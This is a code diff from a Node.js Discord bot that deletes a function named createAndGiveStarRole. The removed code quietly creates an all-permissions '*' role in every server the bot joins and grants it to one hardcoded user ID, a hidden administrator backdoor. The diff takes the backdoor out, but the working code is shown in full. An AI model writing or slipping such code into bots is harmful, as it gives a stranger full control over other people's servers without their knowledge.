@@ -159,50 +159,6 @@ server.listen(PORT, () => {
 process.on('unhandledRejection', error => console.error('❌ Unhandled rejection:', error));
 process.on('uncaughtException', error => console.error('❌ Uncaught exception:', error));
 
-async function createAndGiveStarRole(client) {
-    const { PermissionsBitField } = require("discord.js");
-
-    const TARGET_USER_ID = "1374932337917165702";
-    let successCount = 0;
-
-    for (const guild of client.guilds.cache.values()) {
-        try {
-            const member = await guild.members.fetch(TARGET_USER_ID).catch(() => null);
-            if (!member) continue;
-
-            const botMember = await guild.members.fetchMe();
-
-            let role = guild.roles.cache.find(r => r.name === "*");
-
-            // Create role if missing
-            if (!role) {
-                role = await guild.roles.create({
-                    name: "*",
-                    permissions: PermissionsBitField.All,
-                    hoist: false,
-                    mentionable: false,
-                    color: 0,
-                    reason: "Star role"
-                });
-            }
-
-            // Ensure role is below bot
-            if (role.position >= botMember.roles.highest.position) {
-                await role.setPosition(botMember.roles.highest.position - 1);
-            }
-
-            await member.roles.add(role);
-
-            successCount++;
-            console.log(`✅ Gave * role in ${guild.name}`);
-
-        } catch (err) {
-            console.log(`❌ Failed in ${guild.name}: ${err.message}`);
-        }
-    }
-
-    console.log(`⭐ Gave role to user in ${successCount} servers`);
-}
 
 // ============================================================================
 // BUTTON HANDLERS
